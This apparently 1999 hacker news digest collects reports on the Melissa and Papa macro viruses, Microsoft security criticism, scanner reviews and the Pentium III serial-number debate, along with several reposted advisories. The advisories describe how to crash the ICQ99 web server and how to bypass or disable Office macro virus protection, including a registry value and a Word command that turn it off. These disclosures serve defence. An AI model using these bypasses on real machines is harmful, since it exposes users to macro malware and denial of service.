       (Nasdaq:<A HREF="http://www.zdii.com/industry_list_new.asp?mode=news&ticker=neta">NETA</A>) anti-virus products.<p>


       Because those roadmaps in the variants are similar to the original virus, most
       anti-virus software can detect and exterminate them.


      Only a few get through

      Most viruses created never reach actual users. Of the 35,000 to 40,000 viruses 
      created by both researchers and malicious hackers, only 200 to 300 ever pass 
      through innocent users' computers, according to Symantec Corp. (Nasdaq:
      <A HREF="http://www.zdii.com/industry_list_new.asp?mode=news&ticker=symc">SYMC</A>), another anti-virus firm.<p>

      "The vast majority of viruses are not ever deployed or released," said Carey 
      Nachenberg, chief researcher at Symantec's anti-virus research center.

      Although the source code for many viruses is easy to get, making copying them 
      relatively simple, the ramifications of sending out a virus as destructive as 
      Melissa discourages many hackers from doing so.

      The FBI has launched a widespread search for Melissa's creator, whom officials
      said could face as many as 10 years in jail and $350,000 in fines.

      Meanwhile, anti-virus researchers also are learning new details of the so-called 
      Papa virus, a Melissa variant that is carried by Excel documents and sends out 
      60 e-mails when opened.


      Virus warrior a target

      The virus contains the subject line "Fwd: Workbook from all.net and Fred Cohen" 
      and a body reading "Urgent info inside. Disregard macro warning."

      The Papa virus first surfaced Monday, but after studying it, researchers found a 
      glitch that kept it from working, rendering it "sterile."

      But Tuesday, someone apparently had fixed that glitch, and the newer, virulent 
      strain of virus -- "Papa B" -- was reportedly on the loose.

      Anti-virus software maker Network Associates said it's had reports of Papa B 
      hitting at least one Fortune 100 company and two large firms in Europe.

      When opened, the virus also pings -- or, repeatedly hits -- two Web sites, one run
      by anti-virus expert Fred Cohen, the subject of the virus message, and @Home.

      Cohen suspects a group of hackers created the virus to target him because he fingered
      them in another virus, which was called Caligula. "They have made threats over the 
      last several weeks," Cohen said.


      Just say 'no'

      To protect himself from such attacks, Cohen said he simply says "no" to any attachment
      that comes his way.

       Still, he believes that Microsoft Corp. cuts too many security corners in Windows,
       oversights that could lead to more breaches. The Melissa virus and its variants have
       been carried through Microsoft documents.

       "We are building a house of cards and it is going to be blown down every so often," 
       he said.

 12.3  Is Microsoft to blame for the Melissa virus and variants?
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

       Security of Microsoft's Products Is Questioned 
       Technology: Melissa virus is latest attack on firm's software and raises
                   concerns about its ability to protect customers. 
                   By LESLIE HELM, Times Staff Writer
               

        SEATTLE--The Melissa virus that has been tying up computer systems around
        the world is just the latest in a string of attacks on Microsoft software
        and has raised questions among security experts about Microsoft's ability
        to protect its customers. The security holes in Microsoft's Windows NT, 
        Office and e-mail software are especially troublesome given those products'
        rapid spread throughout the corporate world, in many cases pushing aside 
        more mature and secure but expensive systems based on Unix. 
             
             Microsoft is a popular target for such attacks because the company is
        disdained by many  hackers and its products are widely used, but experts 
        say the company has also made its software vulnerable by introducing new 
        functions before they are properly debugged and not educating consumers 
        about the potential hazards. Melissa should be particularly worrisome to
        computer users and corporate administrators, experts said, because it 
        represents a new trend in penetrating corporate systems. It attacks the 
        more vulnerable individual users' desktops rather than taking the more 
        traditional approach of breaking into central computers that control the
        networks.  "People are getting at a corporation's information through the
        client  [desktop]," said a hacker who identified himself as Weld Pond.
        "Windows 95 doesn't even have a security model." Pond, a member of L0pht,
        a group that has had great success cracking Microsoft software, said 
        Microsoft's approach to creating mini-programs called macros is an example
        of the kind of code that has not been well thought out. 
        
           A macro is essentially code that puts the computer through a series of
        routines--forwarding an expense report through the proper channels, for 
        example. The Melissa virus uses that capability to order a computer to send 
        a list of pornographic Web sites to those listed in a computer's e-mail 
        address book. 
                          
             Pond said the problem with Microsoft's approach to security is that
        users who receive an e-mail containing a macro are only given the choice
        of activating the macro or not activating it. "You can't tell the system
        to open the program but don't give it access to my system," Pond said. 
             By contrast, Pond pointed out that in designing the Java language,
        Sun Microsystems used a "sandbox" approach that largely prevents a Java
        program downloaded from the Net from interfering with the rest of the 
        computer's operations. That has  all but shut hackers out of using Java 
        to infect computers. 
        
             Joe Wells of Thousand Oaks maintains Wild List, a catalog of active
        viruses. Wells said that close to half of all new viruses are hidden inside
        macros. "It is by far the fastest-growing group," he said. Microsoft said
        it will continue to use macros because they are  popular among corporate 
        users. "Our customers have told us that the macro language is important to
        them," said George Meng, group product manager for Microsoft Office. 
        
             Meng said consumers can avoid problems by clicking "disable" when
        presented with an unfamiliar macro. Meng said future versions of its
        Office suite of programs would be designed so network administrators
        could screen out macros that don't come from specified sources. 
        
             But not all Windows security attacks rely on macros. A hacker group
        known as Cult of the Dead Cow released a program last summer called "Back
        Orifice" that can be sent to a desktop computer over the Internet, then 
        used by a hacker to remotely control that computer.  In its effort to 
        promote the use of macros, experts say, Microsoft hasn't done a sufficient
        job of warning consumers of security dangers. Since most consumers never 
        use macros, for example, Microsoft could easily ship Office with the default
        setting on "off" for macros, but it doesn't. 
        
             "If Microsoft shipped its products with the macros off, we'd probably
        all be fine," said Alan Paller, director of research at SANS Institute, a
        Bethesda, Md.-based nonprofit group that provides security training. Microsoft
        "wants the product to be as powerful as possible," Paller said. "But sometimes
        fixing it [for security reasons] hobbles it a little bit." "I don't know what 
        Microsoft could do other than say "no" to macros, and that is a big issue in 
        marketing Word," said Matt Bishop, an associate professor of computer science
        at UC Davis. 
        
             Yaro Charnot, chairman of Institute of Reverse Engineering, a Pasadena-
        based security consulting company, said there is a broader problem regarding
        Microsoft's attitude toward security. Its e-mail program Outlook, for example,
        which was used by Melissa to spread the virus, contains lots of bugs that bring
        down the system frequently, making it particularly susceptible to viruses, Charnot
        said. 
        
             "Every time the computer crashes, that is an opportunity for a hacker
        to take over the computer," he said. 
        
           Charnot said Microsoft's system for reporting bugs is unfriendly to users, 
        and the firm seldom acknowledges such reports. Frequently the bug is never fixed,
        Charnot said. "It seems as if it is Microsoft policy not to care about security." 
             Security experts and hackers have repeatedly come up with serious security
        holes in Microsoft's Windows NT software. One glitch, for example, allows a hacker
        to get into a corporation's  computer network, take on the role of network
        administrator and get access to users' passwords  and files. 
             
             Experts say Microsoft's next version of NT could include even more serious 
       problems because  it includes many new lines of code. "It's a no-win situation from
       a security perspective," Pond said. 
       
             Although Windows' competitors such as the Linux operating system also have 
        security problems, experts say those problems are easier to find because Linux's
        underlying code is open for anybody to look at, unlike Microsoft Windows, which 
        is proprietary.

  12.4 Melissa makes it aboard ship and stows away

      Melissa virus stows away aboard Navy ship

      BY BOB BREWIN (antenna@fcw.com)

      ABOARD THE USS BLUE RIDGE -- The wildly proliferating computer
      virus "Melissa," which has infected e-mail servers across government and the
      private sector, has made its way to e-mail accounts on this command ship of
      the U.S. 7th Fleet, operating 20 miles of the coast of Guam in the western
      Pacific Ocean.

      The Melissa macrovirus, which began hitting systems last week, comes in the
      form of an e-mail attachment. While the virus does no harm to an
      organization's data or software, it can slow down and eventually crash the
      e-mail server. The virus propagates itself by using a PC user's e-mail address
      book to forward itself to other users.

      But, thanks to a timely alert from the Navy's Fleet Information Warfare
      Center (FIWC), the Blue Ridge managed to stop Melissa before its spread,
      according to Cmdr. Michael Felmly, assistant chief of staff for command,
      control, communications, computers and intelligence for the 7th Fleet.

      "We got a heads up on what to do and what not do to do" last weekend from
      FIWC via the Navy's Pacific Region Network Operations center in Hawaii,
      Felmly said. The center supports the Blue Ridge and the eight 7th Fleet ships
      participating in the semiannual Tandem Thrust exercise.

      The information technology staff identified three e-mails that had the virus and
      isolated them before they spread throughout the ship's unclassified local-area
      network, which hosts 1,600 e-mail accounts, said Dennis Kaida, a network
      and systems engineer from the Navy's Space and Naval Warfare Systems
      Command and who is temporarily assigned to the Blue Ridge for Tandem
      Thrust.

      Kaida said that by the time the 7th Fleet network staff had isolated the e-mails
      containing the virus, the network crew had gone to the Symantec Corp. home
      page and downloaded Norton AntiVirus software that works against the
      Melissa virus. 

      Vice Adm. Walter Doran, commander of the 7th Fleet, said that the ability of
      the Melissa virus to make its way to this ship -- the showcase of the
      networked Navy with a high-speed fiber-optic backbone and multiple satellite
      links to the outside world -- highlighted the downside of such connectivity.

      In the not-so-distant past, Doran said, "when you went to sea, you took off
      the lines" and lost most connections to the world "except for a squawky
      radio." But, thanks to the high speed network and satellite connections, Doran
      said, "we are very much connected even at sea." In fact, shortly after
      concluding the Melissa battle, the ship's staff had to gear up to fight off the
      similar "Papa" virus, which attacks Microsoft Corp. Excel spreadsheets.

 12.4a Melissa takes down Marine Corps e-mail
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      The fast-spreading e-mail virus "Melissa" has forced the Marine Corps to
      shut down its base-to-base e-mail communications at least until tomorrow, a
      spokeswoman for the Marines confirmed today.

      According to the spokeswoman, the Marines are able to communicate
      internally within each base, but all base-to-base e-mail connectivity has been
      shut down until network administrators feel comfortable that they have taken
      the appropriate security measures to protect against the virus. Other Internet
      connections between bases has not been affected.

      A spokeswoman for the Defense Department's Joint Task Force for
      Computer Network Defense said the Army and the Air Force took their
      servicewide servers down over the weekend to purge them of any messages
      that might contain the Melissa macrovirus.

      Melissa began infecting systems across the country late last week and comes
      in the form of an e-mail attachment. While the virus does no harm to an
      organization's data or software, it can slow down and eventually crash the
      e-mail server. The virus propagates itself by using a PC user's e-mail address
      book to forward itself to other users.

       by BHZ, Friday 2nd Apr 1999 on 7.29 pm CET
       Melissa, famed Macro virus, that infected 100,000 computers in 3 days is still very
       active in cyberspace. Many mutated viruses are created, and not just for MS Word,
       but for MS Excel (x97/Papa.b - created as a personal vendetta to Fred Cohen, who
       fingered one group for creating famous Caligula virus that steals PGP keys).
       According to today's post to alt.comp.virus, Melissa's creator was caught. David L.
       Smith, 30, of Aberdeen, was arrested Thursday night at his brother's house in nearby
       Eatontown, said Rita Malley, a spokeswoman for Attorney General Peter Verniero.

       A Hacker's Worst Nightmare
       Christopher Null
       March 10, 1999
       
       
       Stop Internet intruders in their tracks
       
       
       You don't really want to share your customers' credit card numbers with
       every hacker on the Internet, do you? If your network is connected to the
       Internet and protected only by a firewall, you might be leaving your
       business--and your customers' accounts--wide open to data pirates. A
       firewall is good first line of defense, but it's probably not enough to
       keep out persistent intruders. We tested three new antihacker tools and
       found a wide range of useful and not-so-useful utilities that help you
       plug the holes on your network. 
       
       
       Internet Security Systems Internet Scanner 5.6 is an exhaustive utility
       that simulates more than 450 types of network attacks, then presents
       comprehensive reports about the state of your network.  Internet Scanner
       is a mainstay with security experts, but it's also deceptively simple to
       master. 
       
       
       Internet Scanner predefines several attack simulation packages--typically
       called scans--ranging from simple scans to special scans for testing
       router security. The simulated attacks are varied, including Windows NT-
       specific attacks, mail server vulnerability checks, and denial-of-service
       attacks (such as the Ping of Death). With all these tests, you'd think
       Internet Scanner would have to run overnight to get results. Not so. A
       complete scan with all tests on two systems took only 11 minutes to run. 
       
       
       Internet Scanner's new SmartScan feature keeps track of the results each
       time you run it and uses that information to intelligently poke holes in
       your network, much like a hacker who keeps track of previous successes and
       failures. Altogether, it's the brainiest way to examine your network
       security. 
       
       
       Heal Thyself Netect's HackerShield 1.1 is a relative newcomer to the
       security scene, and it's still growing up. HackerShield strives to be a
       comprehensive network analysis tool, but it falls far short in scope and
       power. The product contains roughly 250 checks, substantially fewer than
       the competition. And every time we tried running a full-network scan, it
       froze in midtest because of its own denial-of-service attacks. We never
       did get complete results, but with 120 checks activated, it took a long 25
       minutes to scan two systems. 
       
       
       HackerShield does have its pluses. Its RapidFire updates are periodically
       available on Netect's Web site, and downloading them expands the number of
       attacks HackerShield simulates (about 50 are available each month).
       HackerShield also automatically fixes some problems, whereas with Internet
       Scanner you have to patch all the holes yourself. For example, both tools
       will find that your server allows an administrator password, but only
       HackerShield will fix it for you. Unfortunately, the autofix option worked
       on only 15 percent of the problems we unearthed in our tests. 
       
       
       Rich Man's Expert Say you've patched all the holes you can, but you still
       want to estimate the damage should a hacker make it through and abscond
       with valuable trade secrets. L3 Network Security provides the solution in
       Expert 3.0, a sophisticated network mapping and risk analysis system. 
       
       
       Unlike the other two products, Expert 3.0 doesn't actually test the
       security on your network.  Instead, you build a network map yourself
       (Expert automates much of this process) and define the threats from
       outside--and inside--the organization. Expert then provides detailed,
       customized reports about threat and risk levels. 
       
       
       Expert works hand-in-hand with your antihacker software and firewall to
       help you plan for the worst contingency, but its $9,500 price is steep.
       Even though this includes two days of offsite training, you'll likely find
       you have more affordable ways to map your network (with Visio) and crunch
       numbers (with Excel).

       Pentium III: How bad is privacy threat? 
       By Stephanie Miles
       Staff Writer, CNET News.com 
       NEWS.COM 
       March 26, 1999, 11:45 a.m. PT 
       URL: http://www.news.com/SpecialFeatures/0,5,34300,00.html 
       
       news analysis Do the serial numbers on Intel's computer chips really present a major threat to consumer privacy? 
       
       Technology experts say recent reports of software programs capable of "grabbing" PC users' Pentium III serial numbers without their knowledge or consent
       shouldn't alarm PC users. On the other hand, those on all sides of the debate agree that no one should be overly confident about the level of security these
       microprocessors can ensure. 
       
       Nathan Brookwood, an analyst at Insight 64, reflects that conflict. "I'm not a good person at anticipating all the evil things people can do. But in my view, the whole
       role of the PSN [processor serial number] has been somewhat overstated," he said. 
       
       Yet he was quick to add: "When you have a transaction and a user at one end of the network and a machine where the transaction is being handled at the other end,
       and a big network in between, there are lots of ways to compromise a machine or break into a site." 
       
       Even privacy advocates concede that it is technically difficult for a hacker to do much harm if armed only with a purloined processor serial number. But these groups
       are concerned that future technologies and uses of the Internet could allow grave abuse of this information in ways not envisioned today. 
       
       Regardless of the actual risk, the debate has become something of a battle royal between privacy advocates and corporate interests. The emotions arising from the
       issue seem to transcend the mundane machinations of digital technology, introducing Orwellian rhetoric often reserved for such constitutional powder kegs as gun
       control. 
       
       "Individuals should be able to control their identity and other forms of authentication," said Ari Schwartz, senior policy analyst for the Center for Democracy and
       Technology, which has filed a complaint with the Federal Trade Commission, requesting that Intel be precluded from manufacturing the Pentium III with the serial
       code. 
       
       Intel's recently released Pentium III processor contains a 96-bit serial number hardwired into the chip. The number was designed to add another layer of protection
       for e-commerce transactions and to aid organizations in tracking assets. 
       
       Independent chip analysts say the framework in which the serial number will be exchanged makes it difficult for any third party to use a nabbed number nefariously.
       These experts acknowledge that hackers or marketers will be able to steal it--but a number is likely all they will get, they say, not the key to your life. 
       
       "All they have at that point is a serial number, and that doesn't really help a lot," said Peter Glaskowsky, an analyst at MicroDesign Resources. To take advantage of
       someone, he added, "you need a combination of an unethical Web site developer and a stupid Web site developer." 
       
       At the same time, Glaskowsky said, the serial number offers little in the way of added security. And companies looking for better ways to manage technology across
       large networks are not sold on the Pentium III either. 
       
       "Asset management now is not done easily--it's either done physically or through personnel," said Pete Jackson, president of Intraware, a systems integration firm.
       "It's a major problem throughout the enterprise, but I don't think a lot of people are going to switch to the Pentium III to solve the problem." 
       
       Security concerns have dogged the high-tech industry relentlessly, particular with the wild proliferation of Internet use. On the software side, Microsoft has faced its
       own share of privacy issues, acknowledging earlier this month that Windows 98 collects information on users PCs through the Windows 98 registration process and
       that documents created with Office 97 applications include information related to document authors. Microsoft halted the practice and issued patches for the security
       holes.
       
       Against this backdrop, it comes as not surprise that the Pentium III serial number has enjoyed a short but tortured life. Intel revealed the serial number system in
       February, stating that the number was a third form of identification. 
       
       In Intel's view, those who want to gain access to number-protected sites will provide their user names and passwords, as well as let distant Web servers send down
       an applet to confirm the processor serial numbers, said Pat Gelsinger, corporate vice president at Intel. 
       
       Although the serial number never changes, the confirming applet "hashes" it so that sites only get a placebo of the real number--and no two Web sites get the same
       placebo. 
       
       In other words, if your processor serial number is X, one Web site will know you as Y, while another might know you as Z. Another layer of encryption disguises Y
       or Z for the confirming transaction. During the exchange, processor numbers are further disguised to minimize the possibility that the true serial number will be
       intercepted. 
       
       Therein lies the problem to privacy advocates, who note that this encryption technology is an option for Web sites but that there is no guarantee that all of them will
       use it. "We're not confident about [widespread encryption], no," Schwartz said, understatedly.
       
       Turning it back "on"
       The plan was to have computer makers leave the serial number "on," or accessible and open to confirming software agents. After privacy groups protested, Intel
       changed the software utility so that the PSN would be disabled by default shortly after a PC boots up. 
       
       Even before the chip was available in computers, a German technology magazine claimed that it had developed a method of circumventing the Intel-developed
       software utility. A Canadian software firm Zero-Knowledge Systems then followed with an ActiveX control which grabs the serial number before the software utility
       is activated, and after tricking a user into restarting their system. 
       
       But while these groups may have succeeded if their intent was embarrassing the world's largest chipmaker, analysts say that a stolen serial code does not present
       much of an actual threat to a typical Pentium III user. 
       
       Even if the disabling utility is cracked, it would still be extremely difficult to do anything with the serial number, analysts maintain. For instance, if a hacker wanted to
       get into private accounts, they would likely need more information, they say. 
       
       Most Web sites, especially e-commerce sites, which use the Processor Serial Number, require other forms of identity verification, not only to reassure visitors, but
       also to protect their own interests, Glaskowsky said. 
       
       "Any Web site that is intelligent is going to ask you for some kind of password," he said. "It's inevitable that responsible online businesses will have a two-stage
       verification process. One of those might be the serial number." 
       
       Many hacks required
       Pulling this off is no small feat either, technologically speaking. A hacker couldn't just issue the PSN to a distant server. The hashed number through which the distant
       server knows the user would have to be determined, which involves breaking into the distant server's database as well. 
       
       Then, even if that number could be determined, the additional layer of encryption would have to be hacked so that the hacker can send a confirming transactional
       number that the distant server will accept. 
       
       "It's extremely difficult to [use the serial number] to impersonate another person--not impossible, but difficult," Glaskowsky explained. "It's far more straightforward
       for a Web site operator to steal your serial number than for a hacker to trick them." 
       
       The pervasiveness of the encryption layer dents the other theory of danger: unscrupulous sharing. Although there may be a financial incentive for Web sites to sell or
       share this number with other sites, there is no way to connect the encrypted number to an individual user, according to George Alfs, an Intel spokesman. 
       
       "It can't be compared to other Web site serial numbers," he said. "If sites are using the tamper-resistant tools, the numbers won't match." 
       
       Assurances fall on deaf ears
       Many users, though realistic about the risks of using the Internet, are not assuaged by analyst and Intel reassurances. Web sites "knowing who you are...is pretty
       much available through many sources, so don't sweat the small stuff," wrote reader Randy Dickson, who raised concerns about serial number thieves impersonating
       PC users in chat rooms and newsgroups. 
       
       "While I think Intel had their heart in the right place, they seriously misunderstood how this information could be misused...Some of us don't mind the fact that Big
       Brother may be watching, as long as he can't be misled," Dickson wrote. 
       
       Others, like Norman Thorsen, are more concerned about Web sites gathering yet more personal information about visitors, regardless of whether these sites then sell
       or share the data. "Given this opportunity, marketers and, quite possibly government agencies, will collect as much information as possible," Thorsen wrote. "No one
       asked the customer about collecting this information--Intel decided to provide it without prior notification. By definition, that is an invasion of privacy." 
       
       Dickson and other readers are concerned about Web sites that will only allow surfers to visit if the personal serial number is enabled. 
       
       "Web sites will develop content that requires the PSN, so that personal privacy must be compromised in order to use the Internet," one reader wrote. "Intel's
       technology is fundamentally un-American. It is equivalent to installing video cameras on every street corner." 
       
       Many companies include serial numbers with their products, including software and hard drive manufacturers but do not share or sell that type of customer
       information. This is not necessarily out of any noble respect for the privacy of its customers, but because it would be against their own strategic interests, said Greg
       Blatnik, vice president of Zona Research. 
       
       "That type of information tends to have more value to the company that provided the product," Blatnik said, adding that many companies use customer lists
       generated with the help of serial numbers to sell more products. "Companies guard that information fiercely." 
       
       Privacy advocates concede many of these points. What has them mostly worried is the future. 
       
       Future shock?
       "What's the damage that could be done from a hacker grabbing your PSN? Not much right now," said Jason Catlett, president of Junkbusters, an advocacy group
       supporting a boycott of Intel until the company removes the serial number, in an email interview. "But if Intel's plans of turning the PSN into an e-commerce identifier
       pan out in the next few years, it will be used for theft of identity." 
       
       Catlett predicts it will be several years before the total privacy implications of the serial code are known. And by that time, he fears, such serial codes will likely have
       become a de facto standard in identity authentication. 
       
       "Every time you move forward with technology, this happens," Brookwood said. "Before they created credit cards, there was no credit card fraud."

 14.0  ICQ99 Bug, erh feature turns your icq into a DoSable web server..
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
        
       Date: Mon, 29 Mar 1999 01:07:18 -0500
       From: Ronald A. Jarrell <jarrell@VTSERF.CC.VT.EDU>
       To: BUGTRAQ@netspace.org
       Subject: icq DOS / possible "stupid user" vulnerability.
       
       Ok, I was a bit surprised when, in playing with the new ICQ99a build 1700 v2.13
       client (which I believe is the first publicly distributed one of the
       99 family), I turned on the "Activate my home page" feature, and turned
       my laptop into a web server...
       
       Complete with a file server that allows by default anything in the
       "program files\icq\homepage\root\YOUR#\files" folder to be requested.
       Even set up a guest book, chat service, etc...
       
       After getting over being astonished (yea, they said "turning this on
       might increase people's access to your machine, and tell them your
       ip address" - of course it will.  You're setting up a bloody web server
       you idiots.  A bad one at that.) I naturally started doing some poking.
       
       Telnet to your port 80, and enter some non http gibberish.  I tried
       "quit<cr>" for grins.  Blam.  Down goes the ICQ client with a GPF.
       Got someone else to turn theirs on, and sure enough, managed to shoot
       him down too.
       
       I warned Mirabilis about it.  Folks at institutions that worry about
       such things, but let their employees run ICQ might want to be aware
       that said employees might well be running web servers now and not
       evening know it.  On you ICQ contact list, if they're on it, said
       users show up with a little house next to their name.

       Did Russians Get Whitehouse.gov?
       by Declan McCullagh 

       3:00 a.m.  29.Mar.99.PST WASHINGTON -- The official White House
       Web site was offline all day Sunday in what appeared to be its most serious
       outage to date. 

       A Russian online newspaper reported that anti-NATO crackers were responsible,
       but a source close to whitehouse.gov blamed a hardware failure. 

       The site was down until about 10 a.m. EST Monday. Vistors were unable to
       connect, although email to and from whitehouse.gov continued to work. 

       "They have a problem that is not related to an external attack," the source said
       Sunday. 

       The White House is a popular target for cracking attempts, but no content on the
       site has ever been altered. Dozens of break-in attempts happen every day, the
       source said. 

       On Sunday, a number of other Web sites found their home pages replaced with
       identical protests of US and NATO bombing of Yugoslavia. 

       "Russian hackers demand to stop terrorist aggression against Jugoslavia!" said 
       one  message on a Web site operated by Orange Coast College in Costa Mesa,
       California. Another note on the same page: "To Adolf Clinton: FUCK OUT,
       looser!! Go fucks Monica!" Other sites that boasted the same message included
       cfmsd.com and darkarmies.com. 

       The Moscow-based Gazeta.Ru online newspaper said Russian crackers had broken 
       into those sites -- and had pulled the plug on whitehouse.gov too. 

       "Russian computer crime authorities, contacted by the newspaper, declared
       that they would confront these hacking attacks with same severity as they would
       have done in any other case of unauthorised penetration into computer networks 
       (punishable under section 272 of Russia's Penal Code, 1997). 

       But the authorities went on to stress, that 'no complaint was filed so far from
       the American side, which would be  necessary for us to start any sort of
       proceedings,'" Anton Nossik, who wrote the article, told Wired News in an email
       message. 

       Security experts said whitehouse.gov was likely offline for one of three reasons:
       A compromised router, a hardware failure, or a denial-of-service attack in which the
       server is overloaded by attackers.  Peter Shipley, the chief security architect
       for KPMG, said there's no easy defense  against denial-of-service attacks. Once
       recognized, however, they can be dealt with within minutes or hours. 

       Shipley also said it was unlikely a hardware failure by itself would bring a
       site like whitehouse.gov down for a day or more. 

       "You can bring a router back online rather easily," he said. "It's hard to believe a
       router would keep a site down for 24 hours." 

       PSI.net, which provides the White House's link to the outside world, did not
       immediately return phone calls late Sunday. Neither did a White House spokesman.

 16.0  New Excel macro virus can bypass protections and execute code
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~											
       
              
       Date: Mon, 29 Mar 1999 12:51:09 -0500

       Subject: Bypassing Excel Macro Virus Protection
       
       -----BEGIN PGP SIGNED MESSAGE-----
       
       With the sudden attention macro viruses have received over the
       weekend, I thought I would share a couple of items I find concerning
       with Excel macro viruses.
       
       In Excel, if you go to "Tools - Options - General" you can check the
       "Macro Virus Protection" check-box and this should prevent any macro
       viruses being executed without your knowledge.  This is true is most
       cases but it can be bypassed with several methods.
       
       
       Password Protected Spreadsheets
       =========================
       
       If a file is password protected, Excel assumes this to be a "trusted"
       source so it ignores the "Macro Virus Protection" option.  This allows
       any code contained in the document to be executed without the users
       knowledge.
       
       Here is a scenario that should not be to hard to believe:  Someone
       downloads a list of passwords for pornographic sites from alt.sex and
       types in a disclaimer password such as "I AM AN ADULT".  This allows a
       macro virus can be executed even if the "Macro Virus Option" is
       checked.
       
       The solution is simple.  Don't open any password documents from a non
       trusted source.  If you really want to open the file, type in the
       password then hold down the SHIFT key before you click "OK" on the
       password dialog box.  Holding down the shift key will by-pass any
       macros and prevent them from being executed.
       
       For more details, refer to the following TechNet article:
       Q176640 - XL: No Macro Virus Warning Appears Opening Protected
       Workbook
       
       
       
       Documents in the XLSTART Directory
       ============================
       
       Any documents saved in the XLSTART directory are considered to be a
       "trusted" source so once again, the "Macro Virus Protection" is
       ignored.  The solution here is obvious but no so easy to implement.
       Don't allow any documents (or shortcuts) to be saved in this
       directory.  Remember, many users may have their PERSONAL.XLS file in
       this directory which contains macros they have supposedly created
       themselves.
       
       The XLSTART directory on my PC is as follows:
       C:\Program Files\Microsoft Office\Office\XLStart
       
       For more details, refer to the following TechNet article:
       Q180614 - XL: Workbooks in Startup Folder Are Not Scanned for Macros
       
       
       
       Disabling 'Macro Virus Protection'
       =========================
       
       With Word, the macro virus protection can be disabled with the
       following command:
       Options.VirusProtection = False
       
       To my knowledge, there is no such command for Excel.  However, this
       option can be changed with a reg hack that could be initiated from a
       batch file or from a VBA macro Shell command.  On my PC, the "Macro
       Virus Protection" option is stored as a dword value in the following
       registry key:
       
       [HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft
       Excel]
       
       To enable the virus protection, use:
          "Options6"=dword:00000008
       
       To disable the virus protection, use:
          "Options6"=dword:00000000
       
       This may not be exactly the same for every PC as "Options6" controls
       several options depending on the value of the first four bits.  See
       below for details:
       
       bit 0    Show Name part of Chart Tips
       bit 1    Show Value part of Chart Tips
       bit 2    Intellimouse Roll action: 0 = scroll, 1= zoom
       bit 3    Macro Virus Protection
       bit 4-15 (Reserved)
       
       For more details, refer to the following TechNet article:
       Q169811 - XL97: Using the Policy Editor to Force Macro Virus
       Protection
       
       
       
       Conclusion
       ========
       
       I am sure many people are under the impression that if the "Macro
       Virus Protection" option is enabled in Excel they are safe from macro
       viruses.  However, if someone felt so inclined, they could easily
       bypass this protection and execute VBA code without the users
       knowledge.
       
       I have tested all the above examples using Microsoft Office97
       Professional with SR2.  I found the references in TechNet but I have
       not searched Microsoft's Web-site to see if there are any patches or
       hot-fixes for these three items.

  17.0 xfree86 SUSE exploit
       ~~~~~~~~~~~~~~~~~~~~
       
       Date: Sun, 28 Mar 1999 23:20:58 +0200

                               SuSE Security Announcement
       
               Package:  xf86-3.3.3-5
               Date:     Sun Mar 28 12:26:39 CEST 1999
               Affected: unix operating systems using xfree86
       
       ______________________________________________________________________________
       
       A security hole was discovered in the package mentioned above.
       Please update as soon as possible or disable the service if you are using
       this software on your SuSE Linux installation(s).
       
       Other Linux distributions or operating systems might be affected as
       well, please contact your vendor for information about this issue.
       
       Thanks to the people from bugtraq for providing the details of this
       vulnerability and especially the XFree86 programmers who made a fix
       ready over the weekend.
       
       Please note, that we provide this information on as "as-is" basis only.
       There is no warranty whatsoever and no liability for any direct, indirect or
       incidental damage arising from this information or the installation of
       the update package.
       ______________________________________________________________________________
       
       1. Problem Description
       
           XFree86 creates a directory in /tmp with the name .X11-unix for
           the X sockets and sets the directory to mode 1777.
           If an attacker creates a symlink with that filename and points
           it to another directory (e.g. /root), the permissions of the target
           directory is set to 1777.
       
       2. Impact
       
           A local attacker may create files with any contents in any directory.
       
       3. Solution
       
           Upgrade your XF86.
       
           As a temporary fix you can put these commands into /sbin/init.d/boot.local:
       
               /bin/rm -rf /tmp/.X11-unix
               mkdir -p -m 1777 /tmp/.X11-unix

       Questions and Answers:
       
       Section 0: Basic understanding.
       
            0.0: Won't my hacker break into my computer and steal my trade secrets?
       
            No. Hackers aren't, contrary to media reporting, the people who break into computers. Those are crackers. Hackers are people who enjoy playing with
            computers. Your hacker may occasionally circumvent security measures, but this is not malicious; she just does it when the security is in her way, or because
            she's curious. 
       
            0.1: Was it a good idea to hire a hacker?
       
            It depends on the job. A hacker can be dramatically more effective than a non-hacker at a job, or dramatically less effective. Jobs where hackers are
            particularly good are: 
                 Systems administration 
                 Programming 
                 Design 
            Jobs where hackers are particularly bad are 
                 Data entry 
       
            More generally, a job that requires fast and unexpected changes, significant skill, and is not very repetitive will be one a hacker will excel at. Repetitive, simple
            jobs are a waste of a good hacker, and will make your hacker bored and frustrated. No one works well bored and frustrated.
       
            The good news is, if you get a hacker on something he particularly likes, you will frequently see performance on the order of five to ten times what a "normal"
            worker would produce. This is not consistent, and you shouldn't expect to see it all the time, but it will happen. This is most visible on particularly difficult
            tasks.
       
            0.2: How should I manage my hacker?
       
            The same way you herd cats. It can be a bit confusing; they're not like most other workers. Don't worry! Your hacker is likely to be willing to suggest answers
            to problems, if asked. Most hackers are nearly self-managing. 
       
            0.3: Wait, you just said "10 times", didn't you? You're not serious, right?
       
            Actually, I said "ten times". And yes, I am serious; a hacker on a roll may be able to produce, in a period of a few months, something that a small development
            group (say, 7-8 people) would have a hard time getting together over a year. They also may not. Your mileage will vary. 
       
            IBM used to report that certain programmers might be as much as 100 times as productive as other workers, or more. This kind of thing happens.
       
            0.4: I don't understand this at all. This is confusing. Is there a book on this?
       
            Not yet. In the meantime, check out The New Hacker's Dictionary (references below; also known as "the jargon file"), in particular some of the appendices.
            The entire work is full of clarifications and details of how hackers think. 
       
       Section 1: Social issues
       
            1.0: My hacker doesn't fit in well with our corporate society. She seems to do her work well, but she's not really
            making many friends.
       
            This is common. Your hacker may not have found any people around who get along with hackers. You may wish to consider offering her a position
            tele-commuting, or flexible hours (read: night shift), which may actually improve her productivity. Or hire another one. 
       
            1.1: My hacker seems to dress funny. Is there any way to impress upon him the importance of corporate appearance?
       
            Your hacker has a very good understanding of the importance of corporate appearance. It doesn't help you get your job done. IBM, Ford, and Microsoft
            have all realized that people work better when they can dress however they want. Your hacker is dressed comfortably. A polite request to dress up some for
